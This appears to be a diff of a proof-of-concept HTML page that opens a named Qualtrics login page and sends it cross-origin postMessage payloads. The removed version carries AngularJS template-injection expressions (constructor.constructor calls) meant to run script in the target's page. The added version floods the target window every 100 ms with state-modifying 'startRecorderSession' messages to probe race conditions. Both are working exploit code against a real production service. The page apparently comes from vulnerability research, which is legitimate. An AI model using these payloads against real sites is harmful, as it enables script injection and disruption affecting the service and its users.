@@ -2,65 +2,73 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PostMessage Cross-Origin Verification PoC</title>
+    <title>PostMessage Cross-Origin Flood Test</title>
     <style>
         body { font-family: sans-serif; padding: 40px; text-align: center; }
-        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #ea4335; color: white; border: none; border-radius: 5px; font-weight: bold; }
-        button:hover { background: #c53023; }
-        #status { margin-top: 20px; color: #555; font-family: monospace; font-size: 14px; background: #f4f4f4; padding: 10px; display: inline-block; border-radius: 4px; }
+        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #e65100; color: white; border: none; border-radius: 5px; font-weight: bold; }
+        button:hover { background: #b53d00; }
+        #status { margin-top: 20px; color: #333; font-family: monospace; font-size: 14px; background: #ffe0b2; padding: 10px; display: inline-block; border-radius: 4px; }
     </style>
 </head>
 <body>
 
-    <h2>Target Cross-Origin DOM Execution Verification</h2>
-    <p>Click the button below to initialize the cross-boundary postMessage test loop.</p>
+    <h2>Target Cross-Origin Message Flooding Test</h2>
+    <p>This test broadcasts state-modification payloads every 0.1 seconds to test race conditions.</p>
     
-    <button id="startTest">Execute Vulnerability Verification Run</button>
+    <button id="startFlood">Launch & Initiate Flood</button>
     <br><br>
-    <div id="status">Status: Idle. Awaiting interaction...</div>
+    <div id="status">Status: Waiting for user action...</div>
 
     <script>
-        document.getElementById('startTest').addEventListener('click', () => {
-            const targetUrl = "https://capitalcom.qualtrics.com/login";
-            document.getElementById('status').innerText = "Status: Spawning target validation window context...";
+        document.getElementById('startFlood').addEventListener('click', () => {
+            const targetUrl = "https://qualtrics.com";
+            document.getElementById('status').innerText = "Status: Spawning target window...";
 
-            // 1. Establish the window reference connection link
+            // 1. Open the target application tab
             const victimWindow = window.open(targetUrl, "_blank");
 
             if (!victimWindow) {
-                document.getElementById('status').innerText = "Status: Execution Halted - Active popup blocker detected.";
+                document.getElementById('status').innerText = "Status: Error - Popup blocker active.";
                 return;
             }
 
-            document.getElementById('status').innerText = "Status: Target context established. Initiating multi-second scripting stabilization delay...";
+            document.getElementById('status').innerText = "Status: Window opened. Waiting 6 seconds for initial SDK setup...";
 
-            // 2. Introduce a precise delay ensuring the underlying AngularJS client structures finish compilation
+            // 2. Initial buffer delay to let the targeted JS bundles finish compiling
             setTimeout(() => {
-                document.getElementById('status').innerText = "Status: Constructing and transmitting active template evaluation payload...";
+                document.getElementById('status').innerText = "Status: FLOOD ACTIVE. Transmitting payloads every 100ms...";
 
-                // 3. Assemble the payload mapping AngularJS evaluation objects directly into the expected experience block
-                const payload = {
-                    action: "startRecorderSession",
-                    experience: {
-                        id: "poc_cross_origin_xss_test",
-                        locale: "en-US",
-                        theme: {
-                            id: "malicious_spoofed_theme",
-                            // Injects an AngularJS template boundary expression to challenge input parsing safety limits
-                            name: "{{constructor.constructor('alert(document.domain)')()}}",
-                            theme: {
-                                id: "{{constructor.constructor('console.warn(\"Cross-Origin Payload Execution Active\")')()}}"
-                            },
-                            styles: {}
-                        }
+                // 3. Set up an interval loop to fire every 100 milliseconds (0.1s)
+                let messageCount = 0;
+                const floodInterval = setInterval(() => {
+                    // Check if the window was closed by the user to stop the loop
+                    if (victimWindow.closed) {
+                        clearInterval(floodInterval);
+                        document.getElementById('status').innerText = "Status: Target window closed. Flood stopped.";
+                        return;
                     }
-                };
 
-                // 4. Force dispatch across boundaries using wildcard definitions to demonstrate lack of origin validation
-                victimWindow.postMessage(payload, "*");
+                    const payload = {
+                        action: "startRecorderSession",
+                        experience: {
+                            id: "poc_flood_" + messageCount,
+                            locale: "en-US",
+                            theme: {
+                                id: "flooded_theme_override",
+                                name: "Flooded State Loop " + messageCount,
+                                styles: {}
+                            }
+                        }
+                    };
 
-                document.getElementById('status').innerText = "Status: Transmission sequence completed. Monitor the targeted application environment console for execution actions.";
-            }, 6500); // Expanded slightly to 6.5s to ensure heavy third-party bundles completely deploy in the tab
+                    // 4. Fire the message across the boundary
+                    victimWindow.postMessage(payload, "*");
+                    
+                    messageCount++;
+                    document.getElementById('status').innerText = `Status: FLOOD ACTIVE. Messages sent: ${messageCount}`;
+                }, 100); // 100ms = 0.1 seconds
+
+            }, 6000); 
         });
     </script>
 
